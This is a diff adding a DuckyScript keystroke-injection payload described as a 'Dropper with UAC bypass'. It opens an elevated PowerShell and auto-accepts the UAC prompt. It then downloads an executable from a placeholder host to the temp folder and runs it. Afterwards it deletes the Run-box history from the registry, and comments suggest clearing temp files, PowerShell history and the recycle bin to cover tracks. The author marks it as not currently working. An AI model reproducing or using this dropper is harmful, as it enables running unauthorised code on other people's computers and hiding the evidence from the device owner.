@@ -1,0 +1,31 @@
+
+REM Currently not working....
+
+REM Dropper with UAC bypass
+REM By Meldramiriel 
+REM Code credit to I-Am-Jakoby, Mubix, 
+REM Overkill delay, can be changed
+DELAY 2000
+GUI r
+DELAY 500
+REM Starts a powershell console
+STRING powershell Start-Process powershell.exe -Verb runAs
+ENTER
+DELAY 500
+REM alt+y accepts UAC dialogue
+ALT y
+DELAY 750
+REM Downloads file and saves it to %temp% as bob.exe, then runs the file, change to fit your script
+STRING (New-Object System.Net.Webclient).DownloadFile('http://example.com/bob.old','%temp%\bob.exe'); Start-Process "%temp%\bob.exe"
+DELAY 500
+GUI r
+DELAY 500
+REM Cleans up the run box history
+STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+REM clean temp folder "rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue"
+REM delete powershell history "Remove-Item (Get-PSreadlineOption).HistorySavePath"
+REM Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+REM function for this here https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/Clean-Exfil.md
+Enter
+Delay 500
+ 
